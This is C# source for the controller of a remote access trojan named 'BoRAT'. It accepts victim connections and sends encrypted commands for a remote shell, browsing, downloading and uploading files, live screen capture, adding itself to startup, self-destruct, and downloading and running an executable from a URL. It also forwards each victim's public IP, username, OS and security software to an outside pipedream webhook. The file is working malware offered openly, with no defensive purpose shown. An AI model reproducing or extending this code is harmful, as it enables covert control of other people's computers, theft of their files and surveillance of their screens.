using MetroFramework.Forms;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace NexusLabs.BoRAT.Server
{
    public partial class frmMain : MetroForm
    {
        // Change these in Common.cs
        public static bool pipedreamEnabled = Common.pipedreamEnabled;
        public static string pipedreamURL = Common.pipedreamURL;

        // Networking
        public static int port { get; set; }
        public static int bufferSize { get; set; }
        public static Socket serverSocket { get; set; }
        public static Socket targetClient { get; set; }
        public static readonly List<Socket> listSockets = new List<Socket>();
        public static byte[] buffer { get; set; }

        // File Manager
        public static string dirPath { get; set; }
        public static string fdl_location { get; set; }
        public static string fup_location { get; set; }
        public static bool isFileDownload { get; set; }

        public static byte[] receiveFile = new byte[1];
        public static int writeSize;
        public static int fdlSize;

        // Remote View
        public static bool isImage { get; set; }
        public static bool fullScreen { get; set; }
        public static frmRdp fullScreenRdp;

        // Special Toggles
        public static bool DevMode { get; set; }



        public frmMain()
        {
            InitializeComponent();

            DevMode = false;
            tcMain.TabPages.Remove(tpExperimental);
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            try
            {
                // Set the port.
                port = (int)tpConnections_nPort.Value;
            }
            catch (ArgumentOutOfRangeException)
            {
                // Show a message box saying to select a port witin 1-65535.
                MessageBox.Show("Please select a port within 1-65535", "BoRAT");
                return;
            }

            try
            {
                bufferSize = 104857600;
                buffer = new byte[bufferSize];

                serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, port);

                serverSocket.Bind(ipEndPoint);
                serverSocket.Listen(50);
                serverSocket.BeginAccept(AcceptCallback, serverSocket);

                // Update the status.
                UpdateStatus();
            }
            catch (Exception ex)
            {
                // Show the error.
                MessageBox.Show(ex.Message, "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                Socket connection = serverSocket.EndAccept(ar);
                int id = listSockets.Count;
                string command = string.Format("getInfo§{0}", id);

                listSockets.Add(connection);

                AddClientID(id);
                UpdateStatus();

                SendCommand(command, id);

                //create info & command
                connection.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, connection);
                serverSocket.BeginAccept(AcceptCallback, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        private void ReceivecallBack(IAsyncResult ar)
        {
            try
            {
                Socket currentSocket = (Socket)ar.AsyncState;
                int recevied = currentSocket.EndReceive(ar);
                byte[] receivedBuffer = new byte[recevied];

                Array.Copy(buffer, receivedBuffer, recevied);

                //check info
                if (isImage)
                    ProcessImage(receivedBuffer);
                if (isFileDownload)
                    ProcessDUInfo(receivedBuffer);
                else if (!isFileDownload)
                    ProcessNormalInfo(receivedBuffer);

                currentSocket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, currentSocket);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        private void ProcessImage(byte[] data)
        {
            try
            {
                string header = Encoding.Unicode.GetString(data, 0, 16);
                if (header.Equals("rdpImage"))
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        try
                        {
                            Bitmap image = (Bitmap)Image.FromStream(ms);
                            ms.Write(data, 16, data.Length - 16);
                            AddImage(image);
                            Array.Clear(data, 0, data.Length);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        private void ProcessNormalInfo(byte[] receivedBuffer, string command = "")
        {
            try
            {
                command = Encoding.Unicode.GetString(receivedBuffer);
                command = Common.Decrypt(command);

                if (command.StartsWith("infoBack"))
                {
                    string[] info = command.Split('|');
                    AddClientInfo(info[1]);
                }

                else if (command.StartsWith("commandout§"))
                {
                    string results = command.Split('§')[1];
                    UpdateUI(() => tpShell_rtbLog.Text += results);
                }

                else if (command.StartsWith("drivesList§"))
                {
                    string drives = command.Split('§')[1];
                    string[] drivesList = drives.Split('\n');

                    UpdateUI(() => tpFM_listFileManager.Items.Clear());
                    foreach (string driverInfo in drivesList)
                    {
                        if (!driverInfo.Contains("|"))
                            continue;

                        string name = driverInfo.Split('|')[0];
                        string size = driverInfo.Split('|')[1];

                        AddFileManagerInfo(name, size, "N/A", name);
                    }
                }

                else if (command.StartsWith("enterPath§"))
                {
                    string info = command.Split('§')[1];
                    string[] directories = info.Split('\n');

                    UpdateUI(() => tpFM_listFileManager.Items.Clear());

                    foreach (string s in directories)
                    {
                        if (s == "")
                            continue;

                        string name = s.Split('|')[0];
                        string size = s.Split('|')[1];
                        string creationTime = s.Split('|')[2];
                        string path = s.Split('|')[3];

                        AddFileManagerInfo(name, size, creationTime, path);
                    }
                }

                else if (command.StartsWith("backPath§"))
                {
                    string info = command.Split('§')[1];

                    if (info.Equals("driveList"))
                    {
                        UpdateUI(() => drivesListToolStripMenuItem.PerformClick());
                    }
                    else
                    {
                        dirPath = info;
                        SendCommandToTarget("enterPath§" + info);
                    }
                }

                else if (command.StartsWith("fInfo§"))
                {
                    int size = int.Parse(command.Split('§')[1]);
                    fdlSize = size;
                    receiveFile = new byte[fdlSize];
                    isFileDownload = true;
                    SendCommandToTarget("fdlConfirm");
                }

                else if (command.Equals("fupConfirm"))
                {
                    UpdateUI(() => tpFM_rtbLogs.Text += "Upload Request Accepted.\n" +
                                                           "Uploading " + Path.GetFileName(fup_location) + " To " +
                                                           dirPath + "\n");
                    byte[] dataToSend = File.ReadAllBytes(fup_location);
                    SendFileToTarget(dataToSend);
                }

                else if (command.Equals("fileReceived"))
                {
                    UpdateUI(() => tpFM_rtbLogs.Text += "Uploaded.\n");
                }

                else if (command.StartsWith("error§"))
                {
                    processErrors(command.Split('§')[1]);
                }

                else if (command.StartsWith("selfDestruct§"))
                {
                    MessageBox.Show("This client has self-destructed!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                UpdateUI(() =>
                    tpExperimental_rtbLog.Text += "\n[" + DateTime.Now.ToString("h:mm:ss tt") + "] " + command + Environment.NewLine);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        private void ProcessDUInfo(byte[] buffer)
        {
            UpdateUI(() => tpFM_rtbLogs.Text += "Download Request Accepted.\n");
            UpdateUI(() => tpFM_rtbLogs.Text += "Downloading \"" + Path.GetFileName(fdl_location) + "\"" + "\n");
            writeSize = 0;
            Buffer.BlockCopy(buffer, 0, receiveFile, writeSize, buffer.Length);
            writeSize += buffer.Length;

            if (writeSize == fdlSize)
            {
                using (FileStream fs = File.Create(fdl_location))
                {
                    byte[] info = receiveFile;
                    fs.Write(info, 0, info.Length);
                }
            }

            //File.WriteAllBytes(fdl_location, buffer);
            Array.Clear(receiveFile, 0, receiveFile.Length);
            UpdateUI(() => tpFM_rtbLogs.Text += Path.GetFileName(fdl_location) + " Downloaded.\n");
            isFileDownload = false;
        }

        private void processErrors(string errorText)
        {
            if (errorText.Contains("commandFailed"))
            {
                MessageBox.Show("Start command before use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (errorText.Contains("Directory") || errorText.Contains("File") ||
                errorText.Contains("EnterPath") || errorText.Contains("Access"))
                UpdateUI(() => tpFM_rtbLogs.Text += errorText);
        }

        private void SendCommand(string command, int id)
        {
            Socket socket = listSockets[id - 1];
            byte[] data = Encoding.Unicode.GetBytes(command);

            socket.Send(data);
        }

        private void SendCommandToTarget(string command)
        {
            // If the client isn't null.
            if (targetClient != null)
            {
                // Encrypt the command.
                command = Common.Encrypt(command);
                // Get the bytes of the command.
                byte[] dataToSend = Encoding.Unicode.GetBytes(command);

                // Send to the client.
                targetClient.Send(dataToSend);
            }
            else
            {
                // Display a message to the user saying to select a target.
                MessageBox.Show("Select your target!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void SendFileToTarget(byte[] data)
        {
            try
            {
                // Send the file to the client.
                targetClient.Send(data);
            }
            catch (Exception ex)
            {
                // Update the file manager logs.
                UpdateUI(() => tpFM_rtbLogs.Text += ex.Message + "\n");
            }
        }

        private void AddImage(Bitmap image)
        {
            // If the RDP isn't full screen.
            if (!fullScreen)
                // Update the image.
                UpdateUI(() => tpRV_pbView.Image = image);
            else
                // Add the image to the RDP form.
                fullScreenRdp.image = image;
        }

        private void AddClientID(int id)
        {
            UpdateUI(() => tpConnections_listClients.Items.Add(id.ToString()));
        }

        private void AddClientInfo(string info)
        {
            string[] data = info.Split('§');
            int id = int.Parse(data[0]);
            ListViewItem client = new ListViewItem();

            string publicIp = data[1];

            UpdateUI(() => client = tpConnections_listClients.Items[id - 1]);
            UpdateUI(() => client.SubItems.Add(publicIp));
            UpdateUI(() => client.SubItems.Add(data[2]));
            UpdateUI(() => client.SubItems.Add(data[3]));
            UpdateUI(() => client.SubItems.Add(data[4]));
            UpdateUI(() => client.SubItems.Add(data[5]));

            // Detect if pipedream is enabled.
            if (pipedreamEnabled == true)
            {
                // Create a new http client for pipedream.
                HttpClient pipedreamClient = new HttpClient();

                // Bind the data to the request.
                KeyValuePair<string, string>[] pipedreamData = new[]
                {
                    new KeyValuePair<string, string>("pubip", data[1]),
                    new KeyValuePair<string, string>("username", data[2]),
                    new KeyValuePair<string, string>("os", data[3]),
                    new KeyValuePair<string, string>("security", data[4]),
                    new KeyValuePair<string, string>("datetime", data[5])
                };

                // Send a post request to the pipedream endpoint with the data.
                pipedreamClient.PostAsync(pipedreamURL, new FormUrlEncodedContent(pipedreamData)).GetAwaiter().GetResult();
            }
        }

        private void AddFileManagerInfo(string name, string size, string creationTime, string path)
        {
            if (!size.Equals("N/A"))
                size = Common.FormatBytes(long.Parse(size));
            ListViewItem lvi = new ListViewItem();
            lvi.Text = name;
            lvi.SubItems.Add(size);
            lvi.SubItems.Add(creationTime);
            lvi.SubItems.Add(path);

            UpdateUI(() => tpFM_listFileManager.Items.Add(lvi));
            UpdateUI(() => tpFM_listFileManager.Items[0].Selected = true);
        }

        private void UpdateStatus(string text = "n")
        {
            if (text.Equals("n"))
                UpdateUI(() => tpConnections_lblStatus.Text =
                    string.Format("Status: Listening on port {0} | Connections: {1}", port, tpConnections_listClients.Items.Count));
            else
                UpdateUI(() => tpConnections_lblStatus.Text =
                    string.Format(text));
        }

        private void UpdateUI(Action action)
        {
            // Invoke the action parameter.
            Invoke(new Action(action), null);
        }

        private void listClients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
                if (tpConnections_listClients.FocusedItem.Bounds.Contains(e.Location))
                    MenuClients.Show(Cursor.Position);
        }

        private void selectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tpConnections_listClients.Items.Count > 0)
            {
                int id;
                ListViewItem item = tpConnections_listClients.FocusedItem;
                id = int.Parse(item.SubItems[0].Text);
                targetClient = listSockets[id - 1];
                string username = item.SubItems[2].Text;
                string connection = item.SubItems[1].Text;
                string statusText = string.Format("Status: Listening on port {0} | Connections: {1} | Target: {2}", port,
                    tpConnections_listClients.Items.Count, username);
                UpdateStatus(statusText);

                UpdateUI(
                    () => lblStatus.Text = string.Format("Connection: {0} ({1})", connection, username));
            }
        }

        private void txtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                string info = "command§" + tpShell_tbCommand.Text;

                SendCommandToTarget(info);
                tpShell_tbCommand.Text = "";
            }

            else if (e.KeyCode == Keys.Return && tpShell_tbCommand.Text.ToLower().Equals("cls"))
            {
                tpShell_rtbLog.Text = "";
            }
        }

        private void runCommandShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("startCommand");
        }

        private void drivesListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            dirPath = "drivesList";
            SendCommandToTarget("drivesList");
        }

        private void enterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tpFM_listFileManager.SelectedIndices.Count > 0)
            {
                string pathToEnter = tpFM_listFileManager.SelectedItems[0].SubItems[3].Text;
                dirPath = pathToEnter;
                SendCommandToTarget("enterPath§" + pathToEnter);
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dirPath.Equals("drivesList"))
                return;
            SendCommandToTarget("backPath§" + dirPath);
        }

        private void Logs_TextChanged(object sender, EventArgs e)
        {
            UpdateUI(() => tpShell_rtbLog.SelectionStart = tpShell_rtbLog.Text.Length);
            UpdateUI(() => tpShell_rtbLog.ScrollToCaret());
        }

        private void LogsFileManager_TextChanged(object sender, EventArgs e)
        {
            UpdateUI(() => tpFM_rtbLogs.SelectionStart = tpFM_rtbLogs.Text.Length);
            UpdateUI(() => tpFM_rtbLogs.ScrollToCaret());
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tpFM_listFileManager.SelectedItems.Count > 0)
            {
                if (tpFM_listFileManager.SelectedItems[0].SubItems[1].Text.Equals("Directory"))
                {
                    UpdateUI(() => tpFM_rtbLogs.Text += "Cannot Download a Directory!+\n");
                    return;
                }

                if (!File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads"))
                    Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads");

                string filename = tpFM_listFileManager.SelectedItems[0].SubItems[3].Text;
                UpdateUI(() => tpFM_rtbLogs.Text += "Sending Download Request ...\n");
                fdl_location = "ratDownloads\\" + Path.GetFileName(filename);
                SendCommandToTarget("fdl§" + filename);
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string info = dirPath;
            string fileName = "";

            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
                fup_location = ofd.FileName;

            fileName = Path.GetFileName(fup_location);
            info += "\\" + fileName + "§" + new FileInfo(fup_location).Length;

            tpFM_rtbLogs.Text += "Sending Upload Request ...";
            SendCommandToTarget("fup§" + info);
        }

        private void btnStartRdp_Click(object sender, EventArgs e)
        {
            fullScreenRdp = new frmRdp();
            fullScreen = false;
            isImage = true;
            SendCommandToTarget("rdpStart");
        }

        private void btnRdpStop_Click(object sender, EventArgs e)
        {
            isImage = false;
            if (tpRV_pbView.Image != null)
                UpdateUI(() => tpRV_pbView.Image.Dispose());
            UpdateUI(() => tpRV_pbView.Image = null);
            UpdateUI(() => tpRV_cmbChangeView.SelectedIndex = 0);
            if (fullScreenRdp != null)
                fullScreenRdp.Close();
            SendCommandToTarget("rdpStop");
        }

        private void comboRdp_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (tpRV_cmbChangeView.SelectedIndex)
            {
                /*
                 * Zoom Screen
                 * CenterImage
                 * AutoSize
                 * Full Screen
                */

                case 0:
                    fullScreen = false;
                    UpdateUI(() => tpRV_pbView.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
                case 1:
                    fullScreen = false;
                    UpdateUI(() => tpRV_pbView.SizeMode = PictureBoxSizeMode.CenterImage);
                    break;
                case 2:
                    fullScreen = false;
                    UpdateUI(() => tpRV_pbView.SizeMode = PictureBoxSizeMode.AutoSize);
                    break;
                case 3:
                    fullScreen = true;
                    fullScreenRdp.Show();
                    break;
                default:
                    fullScreen = false;
                    UpdateUI(() => tpRV_pbView.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
            }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
        }

        private void btnSuicide_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("selfDestruct");
        }

        private void btnAddToStartup_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("addToStartup");
        }

        private void LogsFileManager_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void toggleDevMode_CheckedChanged(object sender, EventArgs e)
        {
            DevMode = tpAbout_toggleExperiments.Checked;
            if (DevMode) { tcMain.TabPages.Add(tpExperimental); } else { tcMain.TabPages.Remove(tpExperimental); }
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("msgBox§" + tpExperimental_tbMsgBoxTitle.Text + "§" + tpExperimental_tbMsgBoxMsg.Text + "§" + tpExperimental_cbMsgBoxIcons.Text);
        }

        private void tpExperimental_btnShowImage_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("showImage§" + tpExperimental_tbImageURL.Text);
        }

        private void tpExperimental_btnRunOnlineEXE_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("runEXE§" + tpExperimental_tbEXEURL.Text);
        }

        private void tpExperimental_Click(object sender, EventArgs e)
        {

        }
    }
}